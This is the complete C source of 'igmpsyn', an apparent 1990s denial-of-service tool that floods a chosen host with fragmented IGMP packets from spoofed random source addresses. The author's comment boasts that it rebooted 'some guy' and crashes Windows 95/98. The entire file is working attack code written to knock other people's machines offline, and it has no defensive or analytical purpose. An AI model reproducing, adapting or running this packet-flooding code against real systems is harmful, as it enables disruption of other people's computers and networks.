/* My latest dabbling into the art of
   stealing code n altering it to my own
   devices. This one hits a target with
   type 1 igmp requests from random sources.
   25000 packets caused some guy to have
   a glorious  reboot. Its done resonably
   well in  testing, win95/98 appears to
   not like it. A chunk of the code was
   stolen from pimp.c but o well.
   Greets-Commy, Arch, Metal, Monika (love
   you the most), slinkai, and the rest
   of the #teenz crew. 
   Stealth_C^ */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <sys/socket.h>

struct igmp
{
        unsigned char igmp_type;
        unsigned char igmp_code;
        unsigned short igmp_cksum;
        struct in_addr igmp_group;
};

#define ERROR(a) {printf("%s\n", a);exit(-1);}

u_long  resolve(char *);

int main(int argc, char *argv[])
{
 int nsock, ctr;
 char *pkt, *data;
 struct ip *nip;
 struct igmp *nigmp;
 struct sockaddr_in s_addr_in;

 setvbuf(stdout, NULL, _IONBF, 0);

 printf("igmpsyn by Stealth_C^\n");

 if(argc != 3)
  ERROR("usage: igmpsyn (host) (number)");

 if((nsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
  ERROR("could not create raw socket");

 pkt = malloc(1500);
 if(!pkt)
  ERROR("could not allocate memory");

 memset(&s_addr_in, 0, sizeof(s_addr_in));
 memset(pkt, 0, 1500);

 nip = (struct ip *) pkt;
 nigmp = (struct igmp *) (pkt + sizeof(struct ip));
 data = (char *)(pkt + sizeof(struct ip) + sizeof(struct igmp));
 memset(data, 'A', 1500-(sizeof(struct ip) + sizeof(struct igmp)));

 s_addr_in.sin_addr.s_addr = resolve(argv[1]);

 nip->ip_v  = 4;
 nip->ip_hl  = 5;
 nip->ip_tos  = 0;
 nip->ip_id  = 69;
 nip->ip_ttl  = 255;
 nip->ip_p  = IPPROTO_IGMP;
 nip->ip_sum  = 0;
 nip->ip_dst.s_addr = s_addr_in.sin_addr.s_addr;
 nip->ip_src.s_addr = rand() % 5884574;
 nigmp->igmp_type = 1;
 nigmp->igmp_code = 1;
 nigmp->igmp_cksum = 0;

 inet_aton("128.1.1.1", &nigmp->igmp_group);


 printf("attacking \n");
 for(ctr = 0;ctr < atoi(argv[2]);ctr++)
 {
  nip->ip_len  = 1500;
  nip->ip_off  = htons(IP_MF);
  sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,
sizeof(s_addr_in));

  nip->ip_off  = htons(1480/8)|htons(IP_MF);
  sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,
sizeof(s_addr_in));

  nip->ip_off  = htons(5920/8)|htons(IP_MF);
  sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,
sizeof(s_addr_in));

  nip->ip_len   = 831;
  nip->ip_off  = htons(7400/8);
  sendto(nsock, pkt, 831, 0, (struct sockaddr *) &s_addr_in,
sizeof(s_addr_in));
usleep(1000);

 }
 printf("whooped his ass (hopefully)\n");
 shutdown(nsock, 2);
 close(nsock);
}

u_long resolve(char *host)
{
        struct hostent *he;
        u_long ret;

        if(!(he = gethostbyname(host)))
        {
                herror("gethostbyname()");
                exit(-1);
        }
        memcpy(&ret, he->h_addr, sizeof(he->h_addr));
        return ret;
}



